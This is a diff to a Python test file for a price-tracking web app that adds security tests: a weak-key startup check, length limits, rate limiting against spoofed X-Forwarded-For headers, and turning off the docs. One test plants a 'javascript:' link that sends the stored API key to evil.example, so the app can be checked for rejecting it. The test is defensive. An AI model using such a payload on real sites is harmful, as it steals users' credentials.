@@ -16,7 +16,7 @@ import main
 import services
 from extractor import Product, clean_url
 
-KEY = "test-key"
+KEY = "test-key-long-enough-for-the-startup-check"
 H = {"X-API-Key": KEY}
 
 # Fake store catalogue: url -> what the extractor "finds" there.
@@ -690,3 +690,67 @@ def test_a_misspelt_time_zone_stops_the_server_at_startup(tmp_path, monkeypatch)
     with pytest.raises(RuntimeError, match="isn't a time zone"):
         with TestClient(main.app):
             pass
+
+# ------------------------------------------------------------ security sweep
+
+def test_a_weak_api_key_stops_the_server_at_startup(tmp_path, monkeypatch):
+    monkeypatch.delenv("DATABASE_URL", raising=False)
+    monkeypatch.setenv("ONTRACK_DB", str(tmp_path / "k.db"))
+    for weak in ("change-me", "short-key"):
+        monkeypatch.setenv("ONTRACK_API_KEY", weak)
+        with pytest.raises(RuntimeError, match="too easy to guess"):
+            with TestClient(main.app):
+                pass
+
+
+def test_a_page_cannot_plant_a_javascript_link_or_image(client):
+    """A page decides its own canonical address and image. Only web addresses
+    may be saved: "javascript:" would run code in the app if clicked."""
+    page = """<html><head><title>Nice Lamp</title>
+    <link rel="canonical" href="javascript:fetch('https://evil.example/?k='+localStorage.getItem('ontrack.apiKey'))">
+    <meta property="og:title" content="Nice Lamp"><meta property="og:image" content="javascript:alert(1)">
+    <script type="application/ld+json">{"@type":"Product","name":"Nice Lamp","offers":{"price":"499"}}</script>
+    </head></html>"""
+    r = client.post("/items/from-html", data={"url": "https://www.savana.com/details/9"},
+                    files={"html": ("p.html", page, "text/html")}, headers=H)
+    link = r.json()["links"][0]
+    assert link["url"].startswith("https://") and link["image"] is None
+
+
+def test_text_fields_have_length_limits(client):
+    r = client.post("/items", json={"name": "x" * 301, "price": 1}, headers=H)
+    assert r.status_code == 422
+    r = client.post("/items", json={"name": "Lamp", "price": 1, "note": "n" * 2001}, headers=H)
+    assert r.status_code == 422
+
+
+def test_made_up_forwarded_addresses_dont_escape_the_rate_limit(monkeypatch):
+    """Behind Railway's proxy, only the LAST X-Forwarded-For entry (written by
+    the proxy) counts. A sender can't pose as many addresses by inventing the rest."""
+    monkeypatch.setattr(main, "TRUST_PROXY", True)
+    scope = lambda xff: {"client": ("10.0.0.1", 1), "headers": [(b"x-forwarded-for", xff)]}
+    assert main.client_address(scope(b"1.1.1.1, 203.0.113.9")) == "203.0.113.9"
+    assert main.client_address(scope(b"2.2.2.2, 203.0.113.9")) == "203.0.113.9"
+    monkeypatch.setattr(main, "TRUST_PROXY", False)                 # not behind a proxy: header ignored
+    assert main.client_address(scope(b"1.1.1.1")) == "10.0.0.1"
+
+
+def test_page_downloads_have_a_limit_for_everyone_together(client, monkeypatch):
+    """Even from many different addresses, the server downloads at most
+    RATE_LIMIT_HEAVY_TOTAL pages a minute."""
+    monkeypatch.setattr(main, "TRUST_PROXY", True)
+    monkeypatch.setattr(main, "RATE_LIMIT_HEAVY_TOTAL", 3)
+    codes = [client.post("/refresh", headers={**H, "X-Forwarded-For": f"198.51.100.{i}"}).status_code
+             for i in range(4)]
+    assert codes == [200, 200, 200, 429]
+
+
+def test_docs_can_be_turned_off(monkeypatch):
+    import importlib
+    monkeypatch.setenv("ONTRACK_DOCS", "off")
+    hidden = importlib.reload(main)
+    try:
+        assert hidden.app.docs_url is None and hidden.app.openapi_url is None
+    finally:
+        monkeypatch.setenv("ONTRACK_DOCS", "on")
+        importlib.reload(main)
